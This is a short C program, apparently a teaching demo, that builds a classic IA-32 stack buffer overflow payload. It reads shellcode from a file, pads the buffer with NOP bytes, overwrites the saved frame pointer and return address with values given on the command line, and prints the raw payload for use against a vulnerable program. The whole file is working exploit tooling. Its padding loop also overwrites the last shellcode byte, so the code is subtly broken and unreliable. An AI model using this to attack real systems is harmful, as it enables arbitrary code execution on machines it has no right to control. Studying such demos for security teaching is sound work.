/*
 * BOFDemo: A simple buffer overflow vulnerability demo for IA-32
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "usage: %s sc_file bp_off bp_value sc_addr\n",
                argv[0]);
        exit(EXIT_FAILURE);
    }
    char *sc_file = argv[1]; 

    int bp_off = strtol(argv[2], NULL, 10);
    unsigned int bp_value = strtoll(argv[3], NULL, 16);
    unsigned int sc_addr = strtoll(argv[4], NULL, 16);

    int blen = (bp_off + 2) * 4;
    unsigned char *buf = malloc(sizeof(unsigned char) * blen);
    if (buf == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    FILE *fp = fopen(sc_file, "r");
    if (fp == NULL) {
        perror(sc_file);
        exit(EXIT_FAILURE);
    }
    int c, k = 0;
    while ((c = getc(fp)) != EOF && k < blen)
        buf[k++] = c;
    fclose(fp);
    for (int i = k - 1; i < blen; i++)
        buf[i] = 0x90;

    unsigned int *bp = (unsigned int *)buf + bp_off;
    bp[0] = bp_value;
    bp[1] = sc_addr;
    
    for (int i = 0; i < blen; i++)
        putchar(buf[i]);
    free(buf);

    return EXIT_SUCCESS;
}

